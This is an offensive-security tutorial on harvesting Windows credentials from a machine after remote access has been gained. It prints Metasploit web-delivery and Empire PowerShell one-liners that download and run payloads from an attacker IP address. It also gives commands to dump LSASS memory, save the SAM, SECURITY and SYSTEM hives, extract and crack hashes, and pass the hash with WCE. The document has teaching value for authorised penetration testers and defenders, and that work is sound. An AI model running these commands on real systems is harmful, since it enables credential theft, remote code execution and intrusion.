=================================================================================
Learning from the field: Gathering Windows Credentials & High-Impact Exploitation
=================================================================================

From the previous post, we learned how to have authenticated remote shell in windows, in this post, we will have a look around of how to **gather credentials after getting a remote shell**. We would also have a look how to have a **High-Impact post exploitation** which leaves an impact to the higher mangagement for the organization.

**Gather Credentials Summary**

In this section, we have explained how windows stores the credentials, How we can gather credentials after getting remote shell via Metasploit web delivery, powershell empire agent, dumping lsass.exe, reading registry hives, using Windows credential editor, System-SAM file, virtual machines memory etc.

Concepts
--------

With administrative access, an attacker can steal credentials from several locations on the computer, including:
* The Security Accounts Manager (SAM) database.
* Local Security Authority Subsystem (LSASS) process memory.
* Domain Active Directory Database (domain controllers only).
* The Credential Manager (CredMan) store.
* LSA Secrets in the registry.

Before we dig down in gathering credentials from a compromised machine, we should understand about Windows authentication protocols, windows credential type and where are the credentials stored in windows.

Windows authentication protocols and credential types
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Windows supports a number of different types of credentials and authentication protocols, depending on the operating system version and configuration.

**Windows authentication protocols**

The following table provides information on Windows authentication protocols and a brief description of each supported protocol.

+-----------+-----------------------------------------------------------------------------------------------------------------------------+
| Protocol  | Description                                                                                                                 |
+===========+=============================================================================================================================+
| Kerboros  | Kerberos is the default and preferred authentication protocol for domain authentication on current Windows operating        |
|           | systems. Kerberos relies on a system of keys, tickets, and mutual authentication in which keys are normally not passed      |
|           | across the network. (Direct use of the key is permitted for some application clients under certain circumstances).          |
|           | Certain Kerberos-specific objects that are used in the authentication process are stored as LSA secrets in memory,          |
|           | such as Ticket Granting Tickets (TGT) and Service Tickets (ST). TGTs are Single sign-on (SSO) authentication credentials    |
|           | that can be reused for lateral movement or privilege escalation, while STs are not credentials that can be used for lateral |
|           | movement or privilege escalation.                                                                                           |
+-----------+-----------------------------------------------------------------------------------------------------------------------------+
|NTLM       | NTLM protocols are authentication protocols that use a challenge and response method to make clients mathematically prove   |
|           | that they have possession of the NT hash. Current and past versions of Windows support multiple versions of this protocol,  |
|           | including NTLMv2, NTLM, and the LM authentication protocol.                                                                 |
+-----------+-----------------------------------------------------------------------------------------------------------------------------+
|Digest     | Digest is a standards-based protocol typically used for HTTP and Lightweight Directory Access Protocol (LDAP) authentication|
|           | Digest authentication is described in RFCs 2617 and 2831. 								  |
+-----------+-----------------------------------------------------------------------------------------------------------------------------+
Windows stores in memory information about every current and past successful logon. These are called logon session. This information includes the username, the domain or workgroup name and both the LM and NT password hashes. Every time a legitimate user logs onto a Windows system, the Local Security Authority (LSA) stores in memory this information. This happens regardless of the logon type: interactive logon to the console or remote logon via Remote Desktop Protocol (RDP). The same information is stored for RunAs processes and services running as specific users. In the latter case, the clear-text password is stored in memory and can be retrieved in LSA secrets anyway. Exception being network logons, for instance over SMB or HTTP; these do not get stored because the NT/LM hashes never actually reach the server. A challenge-response mechanism is used for authentication. This sensible information is kept in memory because it is used for Single Sign-On (SSO) purposes.

SSO technology is extensively used in Windows network, particularly within domains. This allows, for instance, a user logged into a certain system of the domain to access remote shares, shared resources like printers and HTTP proxy protected by NTLM authentication without the need to type in his clear-text credentials each time: Windows deals with the authentication for him transparently over the network by providing exactly what is stored in memory: username, domain/workgroup and password hashes. This authentication mechanism works because nowadays nearly all Windows services accept authentication with NT/LM hashes as an alternative to clear-text password. Exception being Remote Desktop Protocol. Also,  When a user logged on using remote desktop, the logon session remain in the memory. Either if you disconnect (clicking on the top right X button of your RDP client) or log off from the Start menu, they remain in memory ( Windows Vista onwards the logon sessions are erased from memory a few minutes after the user has logged off).

The above has been taken from Bernardo Damele A G Blog `Dump Windows password hashes efficiently - Part 5 <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes_28.html>`_ 

Gathering Windows Credentials
------------------------------

Once we have remote shell, our next task is to run mimikatz and get all the passwords ( clear-text or hashed ). A lot of stuff has already been mentioned at `Obtaining Windows Passwords <http://netsec.ws/?p=314>`_ and `Dumping Windows Credential <https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/>`_ and Bernardo Blog Dump Windows password hashes efficiently `Part1 <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes.html>`_ , `Part2 <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes_16.html>`_, `Part3 <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes_20.html>`_, `Part4: <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes_21.html>`_, `Part5 <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes_28.html>`_ and `Part6 <http://bernardodamele.blogspot.in/2011/12/dump-windows-password-hashes_29.html>`_.

We have tried to combine all the methods in one post. (A lot of stuff has also been not mentioned such fgdump, pwdump etc.). For all methods, check `Credential Dumping <https://attack.mitre.org/wiki/Technique/T1003>`_ on ATT&CK. 

So, back to credential dumping after getting a remote shell, there are multiple methods to do the following (Of gathering meterpreter or empire session or any other method):


Metasploit Web Delivery
^^^^^^^^^^^^^^^^^^^^^^^^

`Metasploit Web Delivery <https://www.offensive-security.com/metasploit-unleashed/web-delivery/>`_ : Metasploitâ€™s Web Delivery Script is a versatile module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine. This module has a powershell method which generates a string which is needed to be executed on remote windows machine.

::

  msf > use exploit/multi/script/web_delivery 
  msf exploit(web_delivery) > show targets 

  Exploit targets:
  
     Id  Name
     --  ----
     0   Python
     1   PHP
     2   PSH  
  
  
  msf exploit(web_delivery) > set target 2
  target => 2
  msf exploit(web_delivery) > set payload windows/x64/meterpreter/reverse_https 
  payload => windows/x64/meterpreter/reverse_https
  msf exploit(web_delivery) > set lhost 14.97.131.138
  lhost => 14.97.131.138
  msf exploit(web_delivery) > run 
  [*] Exploit running as background job.

  [*] Started HTTPS reverse handler on https://14.97.131.138:8443
  msf exploit(web_delivery) > [*] Using URL: http://0.0.0.0:8080/uMOKs6wtlYL
  [*] Local IP: http://14.97.131.138:8080/uMOKs6wtlYL
  [*] Server started.
  [*] Run the following command on the target machine:
  powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');

When the following command (when their is no proxy)

::

  powershell.exe -nop -w hidden -c $X=new-object net.webclient;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');

or (when there is proxy)

::

  powershell.exe -nop -w hidden -c $X=new-object net.webclient;$X.proxy=[Net.WebRequest]::GetSystemWebProxy();$X.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $X.downloadstring('http://14.97.131.138:8080/uMOKs6wtlYL');
 

is executed on the windows remote machine, we should get a meterpreter.

::

  Delivery web_delivery payload
  meterprerter>

Powershell Empire
^^^^^^^^^^^^^^^^^^

`Powershell Empire agent <https://www.powershellempire.com/>`_ : Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.

After creating a listener, we just need to create a launcher using stager:

::

 (Empire: listeners) > usestager launcher 
 (Empire: stager/launcher) > set Listener test
 (Empire: stager/launcher) > generate
 powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AGUAbQAuAE4ARQBUAMAA7ACQAdwBDAD0ATgBFAFcALQBPAGIASgBlAGMAVAAgAFMAeQBTAFQAZQBNAC4ATgBlAHQALgBXAEUAQgBDAGwASQBFAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAG*snip*4AOQA3AC4AMQAzADEALgAxADMAOAA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAEIAWABPAFIAJABLAFsAJABJACsAKwAlACQASwAuAEwAZQBOAEcAdABIAF0AfQA7AEkARQBYACAAKAAkAEIALQBKAG8ASQBOACcAJwApAA==

When the above command is executed on the windows remote shell, we should be able to get a powershell agent

::

 (Empire) > [+] Initial agent 2FTFYMKDFSSFS from 192.168.42.5 now active


Sometimes the above two will fail to work, in which case, we revert to the old techniques:

Dump Lsass.exe (Local Security Authority Subsystem Service)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Using Procdump: This method has been mentioned `Grabbing Passwords from Memory using Procdump and Mimikatz <https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/>`_ , `How Attackers Extract Credentials (Hashes) From LSASS <https://adsecurity.org/?p=462>`_ , `Mimikatz Minidump and mimikatz via bat file <http://carnal0wnage.attackresearch.com/2013/07/mimikatz-minidump-and-mimikatz-via-bat.html>`_ , `Extracting Clear Text Passwords Using Procdump and Mimikatz  <http://c0d3xpl0it.blogspot.in/2016/04/extracting-clear-text-passwords-using-procdump-and-mimikatz.html>`_ and `I'll Get Your Credentials ... Later! <http://www.fuzzysecurity.com/tutorials/18.html>`_

 * First, upload the `ProcDump.exe <https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx>`_ to the remote computer by using smb, windows explorer.

 * Second, from the remote shell, execute

  ::

   C:\Windows\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp     => For 32 bit system
   C:\Windows\temp\procdump.exe -accepteula -ma -64 lsass.exe lsass.dmp => For 64 bit system

 * Download the lsass.dmp and use mimikatz to get the passwords.

* Using Powershell Out-MiniDump

 This method is similar to the procdump using powershell. Instead of procdump, we utilize powershell `Out-MiniDump.ps1 <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1>`_ from PowerSploit

 * Launch PowerShell and `dot source <http://ss64.com/ps/source.html>`_ function from the Out-Minidump.ps1

  ::
   
   . c:\path\to\Out-Minidump.ps1

 * Create dump of the process using this syntax:

  ::

   Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp

Registry Hives
^^^^^^^^^^^^^^^

Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your local system:

::

 C:\> reg.exe save hklm\sam c:\temp\sam.save
 C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save

Get the password hashes of the local accounts, the cached domain credentials and the LSA secrets in a single run with Impacket secretsdump.py

::

 $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 Impacket v0.9.11-dev - Copyright 2002-2013 Core Security Technologies

 [*] Target system bootKey: 0x602e8c2947d56a95bf9cfxxxxxxxxxxx
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 admsys  :500 :aad3b435b51404eeaad3b435b51404ee:3e24dcead23468ce597d68xxxxxxxxxx:::
 Guest   :501 :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59dxxxxxxxxx:::
 support :1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b5xxxxxxxxx:::
 [*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
 adm2:6ec74661650377df488415415bf10321:system1.example.com:EXAMPLE:::
 Administrator:c4a850e0fee5af324a57fd2eeb8dbd24:system2.example.COM:EXAMPLE:::
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC
 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9adxxxxxxxxxx

Windows Credential Editor (WCE)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Windows Credentials Editor (WCE) is a security tool that allows to list Windows logon sessions and add, change, list and delete associated credentials (e.g.: LM/NT hashes, Kerberos tickets and cleartext passwords).

The tool allows users to:

* Perform Pass-the-Hash on Windows
* 'Steal' NTLM credentials from memory (with and without code injection)
* 'Steal' Kerberos Tickets from Windows machines
* Use the 'stolen' kerberos Tickets on other Windows or Unix machines to gain access to systems and services
* Dump cleartext passwords stored by Windows authentication packages


**Examples:**

* List NTLM credentials in memory: By default, WCE lists NTLM credentials in memory, no need to specify any options.

 ::

  C:\Users\test>wce.exe
  WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
  Use -h for help.
 
  theuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 

* Create a new logon session and launch a program with new NTLM credentials?

 ::

  wce.exe -s <username>:<domain>:<lmhash>:<nthash> -c <program>

 Example:

 ::
 
  C:\Users\test>wce.exe -s testuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 -c cmd.exe
 
  WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
  Use -h for help.
 
  Changing NTLM credentials of new logon session (000118914h) to:
  Username: testuser
  domain: amplialabs
  LMHash: 01FC5A6BE7BC6929AAD3B435B51404EE
  NTHash: 0CB6948805F797BF2A82807973B89537
  NTLM credentials successfully changed!
 
 At this point, a new cmd.exe instance will be launched and network connections using NTLM initiated from that instance will use the NTLM credentials specified. 
 
* Write hashes obtained by WCE to a file?

 ::
 
  C:\>wce -o output.txt
  WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
  Use -h for help.
 
  C:\>type output.txt
  test:AMPLIALABS:01020304050607080900010203040506:98971234567865019812734576890102
 
* Dump logon cleartext passwords with WCE?

 The -w switch can be used to dump logon passwords stored in cleartext by the Windows Digest Authentication package. For example:
 
 ::
 
  C:\>wce -w
  WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity com)
  Use -h for help.
  
  
  test\MYDOMAIN:mypass1234
  NETWORK SERVICE\WORKGROUP:test
  
 `This <http://www.youtube.com/watch?v=tJ0VJVrhwTE&ap=%2526fmt%3d22>`_ video shows the use of the -w switch in a Windows 2008 Server

Useful Information:

* Cachedump obtains NTLM credentials from the Windows Credentials Cache (aka logon cache, logon information cache, etc). This cache can be disabled and it is very often disabled by network/domain/windows administrators (`see here <http://support.microsoft.com/kb/172931>`_ ). WCE will be able to steal credentials even when this cache is disabled.

* WCE obtains NTLM credentials from memory, which are used by the system to perform SSO; it uses a series of techniques the author of WCE developed.

* Pwdump dumps NTLM credentials from the local SAM. Let's say a administrator remote desktop to a server (compromised by attacker and can run wce). In this case, WCE would be able get the credential of Administrator ( who RDP'd ), However, pwdump will only allow you to obtain the NTLM credentials of the local SAM

The above information has been taken from `WCE FAQ <http://www.ampliasecurity.com/research/wcefaq.html>`_

System/ Security / SAM File
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

During penetration assesment, we do find VMDK file (Virtual Machine Disk), we should be able to mound vmdk file either by using Windows Explorer, VMWare Workstation or OSFMount. After mounting, we should be able to copy 

:: 

 System32/config/SYSTEM
 System32/config/SECURITY

Passwords from these file could be extracted by using `creddump7 <https://github.com/Neohapsis/creddump7>`_ 

Run cachedump.py on the SYSTEM and SECURITY hives to extract cached domain creds:

::

 # ./cachedump.py
 usage: ./cachedump.py <system hive> <security hive> <Vista/7>
 
 Example (Windows Vista/7):
 ./cachedump.py /path/to/System32/config/SYSTEM /path/to/System32/config/SECURITY true
 
 Example (Windows XP):
 ./cachedump.py /path/to/System32/SYSTEM /path/to/System32/config/SECURITY false
 
 # ./cachedump.py /mnt/win/Windows/System32/config/SYSTEM /mnt/win/Windows/System32/config/SECURITY true |tee hashes
 nharpsis:6b29dfa157face3f3d8db489aec5cc12:acme:acme.local
 god:25bd785b8ff1b7fa3a9b9e069a5e7de7:acme:acme.local

If you want to crack the hashes and have a good wordlist, John can be used. The hashes are in the 'mscash2' format:

::

 # john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt hashes
 Loaded 2 password hashes with 2 different salts (M$ Cache Hash 2 (DCC2) PBKDF2-HMAC-SHA-1 [128/128 SSE2 intrinsics 8x])
 g0d              (god)
 Welcome1!        (nharpsis)

The examples above are taken from creddump7 Readme

Virtual Machine Snapshots And Suspended States - Vmss2core
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

This method has been directly taken from the Fuzzy Security Blog `I'll Get Your Credentials ... Later! <http://www.fuzzysecurity.com/tutorials/18.html>`_

After compromising a target if we discover that the box hosts Virtual Machines. We can utilize `vmss2core <https://labs.vmware.com/flings/vmss2core>`_ , we can use this tool to create a coredump of a Virtual Machine, If that machine has suspended (*.vmss) or snapshot (*.vmsn) checkpoint state files. These files can be parsed by the volatility framework to extract a hashdump.

Make sure to use the appropriate version of vmss2core, in this case I needed the 64-bit OSX version.

::

 # We are working with a suspended state so we need to combine *.vmss and *.vmem. If we were
  dealing with a snapshot we would need to combine *.vmsn and *.vmem.
	
 Avalon:Tools b33f$ ./vmss2core_mac64 -W
 /Users/b33f/Documents/VMware/VMs/Win7-Testbed/Windows\ 7.vmwarevm/Windows\ 7-e7a44fca.vmss 
 /Users/b33f/Documents/VMware/VMs/Win7-Testbed/Windows\ 7.vmwarevm/Windows\ 7-e7a44fca.vmem

 vmss2core version 3157536 Copyright (C) 1998-2013 VMware, Inc. All rights reserved.
 Win32: found DDB at PA 0x2930c28
 Win32: MmPfnDatabase=0x82970700
 Win32: PsLoadedModuleList=0x82950850
 Win32: PsActiveProcessHead=0x82948f18
 Win32: KiBugcheckData=0x82968a40
 Win32: KernBase=0x82806000

 Win32: NtBuildLab=0x82850fa8
 Win: ntBuildLab=7601.17514.x86fre.win7sp1_rtm.101119-1850  # Win7 SP1 x86
 CoreDumpScanWin32: MinorVersion set to 7601
 ... 10 MBs written.
 ... 20 MBs written.
 ... 30 MBs written.
 ... 40 MBs written.
 ... 50 MBs written.
 
 [...Snip...] 
 
 Finished writing core.

After transferring the coredump back out we can let volatility do it's magic. We need to determine which OS the dump comes from for volatility to parse it correctly.

:: 

 # We can see that volatility is unable to accurately determine the OS profile, however from the vmss2core
   output above we can see that the correct profile is "Win7SP1x86". 
 	
 root@Josjikawa:~/Tools/volatility# ./vol.py imageinfo -f ../../Desktop/memory.dmp 
 
 Determining profile based on KDBG search...
 
           Suggested Profile(s) : Win7SP0x86, Win7SP1x86 (Instantiated with WinXPSP2x86)
                      AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                      AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS)
                      AS Layer3 : FileAddressSpace (/root/Desktop/memory.dmp)
                       PAE type : PAE
                            DTB : 0x185000L
              KUSER_SHARED_DATA : 0xffdf0000L
            Image date and time : 2014-09-13 19:15:04 UTC+0000
      Image local date and time : 2014-09-13 21:15:04 +0200

Using the "hivelist" plugin we can now get the memory offsets for the various registry hives.

:: 

 root@Josjikawa:~/Tools/volatility# ./vol.py hivelist -f ../../Desktop/memory.dmp --profile=Win7SP1x86

 Volatility Foundation Volatility Framework 2.4
 
 Virtual    Physical   Name
 ---------- ---------- ----
 0x988349c8 0x3945a9c8 \??\C:\Users\Fubar\AppData\Local\Microsoft\Windows\UsrClass.dat
 0x87a0c008 0x27f9f008 [no name]
 0x87a1c008 0x280ed008 \REGISTRY\MACHINE\SYSTEM                # SYSTEM
 0x87a3a6b0 0x27d4b6b0 \REGISTRY\MACHINE\HARDWARE
 0x87abe5c0 0x2802a5c0 \SystemRoot\System32\Config\DEFAULT
 0x880b5008 0x231b7008 \SystemRoot\System32\Config\SECURITY
 0x88164518 0x231cc518 \SystemRoot\System32\Config\SAM         # SAM
 0x8bd019c8 0x24aec9c8 \Device\HarddiskVolume1\Boot\BCD
 0x8bdd2008 0x24772008 \SystemRoot\System32\Config\SOFTWARE
 0x8f5549c8 0x1f39e9c8 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
 0x90e83008 0x1f09f008 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
 0x955a9450 0x15468450 \??\C:\System Volume Information\Syscache.hve
 0x988069c8 0x3aa329c8 \??\C:\Users\Fubar\ntuser.dat


All that remains now is to dump the hashes. To do this we need to pass volatility's "hashdump" module the virtual memory offsets to the SYSTEM and SAM hives, which we have.

::

 root@Josjikawa:~/Tools/volatility# ./vol.py hashdump -f ../../Desktop/memory.dmp --profile=Win7SP1x86
 sys-offset=0x87a1c008 sam-offset=0x88164518
 
 Volatility Foundation Volatility Framework 2.4 
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Fubar:1001:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
 user1:1003:aad3b435b51404eeaad3b435b51404ee:7d65996108fccae892d38134a2310a4e:::

These Virtual Machine coredumps can be very large (1 GB+). If transferring them over the network is not an option you can always drop a copy of volatility on the target machine. Starting from version 2.4, volatility has binary packages for Windows, Linux and OSX.

::
 
 # Binary package on OSX 10.9.4

 Avalon:Volatility-2.4 b33f$ ./volatility_2.4_x64 hashdump -f ../memory.dmp --profile=Win7SP1x86
 sys-offset=0x87a1c008 sam-offset=0x88164518 
 
 Volatility Foundation Volatility Framework 2.4
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Fubar:1001:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
 user1:1003:aad3b435b51404eeaad3b435b51404ee:7d65996108fccae892d38134a2310a4e:::


High Impact Exploitation
^^^^^^^^^^^^^^^^^^^^^^^^^

* The Email- Mailbox Post exploitation -- Also the check if someone has exploited this (check logs) -- which is also connected to Domain? 


  * How does google email works?

  * File Hunting -- Better ways!! Faster ways!!




